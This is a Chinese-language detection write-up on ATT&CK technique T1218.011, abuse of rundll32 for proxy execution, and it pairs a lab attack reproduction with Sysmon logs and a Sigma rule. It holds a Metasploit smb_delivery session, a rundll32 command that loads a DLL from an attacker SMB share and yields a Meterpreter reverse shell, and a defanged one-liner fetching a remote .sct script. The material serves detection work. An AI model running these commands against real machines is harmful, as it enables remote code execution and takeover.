# T1218-011-win-基于白名单Rundll32.exe执行payload

## 来自ATT&CK的描述

Rundll32.exe程序可以调用来执行任意二进制文件。攻击者可能会利用此功能来代理执行代码，从而避免触发那些可能不会监控rundll32.exe进程执行的安全工具，因为正常操作中使用rundll32.exe的Windows会有白名单或误报。

Rundll32.exe可用于通过未记录的shell32.dll函数Control_RunDLL和 Control_RunDLLAsUser来执行控制面板项目文件（.cpl）。双击.cpl文件也会触发rundll32.exe执行。

Rundll32也可用于执行JavaScript等脚本。可以使用类似于下面的语法来完成：rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" 。这种方法已被恶意软件如Poweliks所使用。

## 测试案例

Rundll32.exe是指“执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数,功能就是以命令行的方式调用动态链接程序库。

说明：Rundll32.exe所在路径已被系统添加PATH环境变量中，因此，Wmic命令可识别，需注意x86，x64位的Rundll32调用。

windows 2003默认位置：

```bash
C:\Windows\System32\rundll32.exe
C:\Windows\SysWOW64\rundll32.exe
```

win7默认位置：

```bash
C:\Windows\System32\rundll32.exe
C:\Windows\SysWOW64\rundll32.exe
```

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：win7（sysmon日志）

### 攻击分析

#### 配置MSF

```bash
msf5 > use exploit/windows/smb/smb_delivery
msf5 exploit(windows/smb/smb_delivery) > set srvhost 192.168.126.146
srvhost => 192.168.126.146
msf5 exploit(windows/smb/smb_delivery) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.126.146:4444
[*] Started service listener on 192.168.126.146:445
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\192.168.126.146\huwSj\test.dll,0
```

#### 靶机执行payload

```cmd
rundll32.exe \\192.168.126.146\huwSj\test.dll,0
```

#### 反弹shell

```bash
msf5 exploit(windows/smb/smb_delivery) > [*] Sending stage (180291 bytes) to 192.168.126.149
[*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.149:49381) at 2020-04-17 15:24:05 +0800
msf5 exploit(windows/smb/smb_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information                         Connection
  --  ----  ----                     -----------                         ----------
  1         meterpreter x86/windows  12306Br0-PC\12306Br0 @ 12306BR0-PC  192.168.126.146:4444 -> 192.168.126.149:49381 (192.168.126.149)
msf5 exploit(windows/smb/smb_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: 12306Br0-PC\12306Br0
```

## 测试留痕

sysmon日志记录

```log
EVentID: 1
Image: C:\Windows\SysWOW64\rundll32.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe  \\192.168.126.146\huwSj\test.dll,0
```

win7安全日志记录

```log
EVentID: 4688
进程信息:
新进程 ID: 0xa30
新进程名: C:\Windows\SysWOW64\rundll32.exe

EVentID: 5158
应用程序信息:
进程 ID: 2608
应用程序名称: \device\harddiskvolume2\windows\syswow64\rundll32.exe

EVentID: 5156 #Windows 筛选平台已允许连接。
应用程序信息:
进程 ID:2608
应用程序名称: \device\harddiskvolume2\windows\syswow64\rundll32.exe

网络信息:
方向: 出站
源地址: 192.168.126.149
源端口: 49381
目标地址: 192.168.126.146
目标端口: 4444
```

## 检测规则/思路

### sigma

```yml
title: Suspicious Call by Ordinal
id: e79a9e79-eb72-4e78-a628-0e7e8f59e89c
description: Detects suspicious calls of DLLs in rundll32.dll exports by ordinal
status: experimental
references:
    - https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/
    - https://github.com/Neo23x0/DLLRunner
    - https://twitter.com/cyb3rops/status/1186631731543236608
tags:
    - attack.defense_evasion
    - attack.execution
    - attack.t1085
author: Florian Roth
date: 2019/10/22
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine: '*\rundll32.exe *,#*'
    condition: selection
falsepositives:
    - False positives depend on scripts and administrative tools used in the monitored environment
    - Windows contol panel elements have been identified as source (mmc)
level: high
```

### 建议

通过进程监控来检测和分析rundll32.exe的执行和参数。比较rundll32.exe的近期调用与历史已知合法参数及已加载动态链接库来确定是否有异常和潜在的攻击活动。在rundll32.exe调用之前和之后使用的命令参数也可用于确定正在加载的动态链接库的来源和目的。

## 参考推荐

MITRE-ATT&CK-T1218-011

<https://attack.mitre.org/techniques/T1218/011/>

windows下基于白名单获取shell的方法整理（上）

<http://www.safe6.cn/article/155>
